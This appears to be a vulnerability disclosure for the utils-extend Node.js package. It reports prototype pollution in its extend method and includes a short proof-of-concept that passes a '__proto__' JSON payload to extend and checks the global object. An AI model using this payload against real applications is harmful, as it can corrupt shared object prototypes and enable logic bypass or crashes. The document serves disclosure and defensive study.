# Description
```utils-extend``` is a package to extend nodejs util api, and it is light weight and simple. 
This package is vulnerable to prototype pollution in the ```extend``` method. 

# Proof-of-concept
```
const utils = require('utils-extend');
var payload = '{"__proto__":{"polluted":true}}';
var s = {
        k: 'v',
        k2:[]
};
var s1 = {
        k3: {}
};
var res = utils.extend(s, JSON.parse(payload), s1);
console.log({}.polluted);
```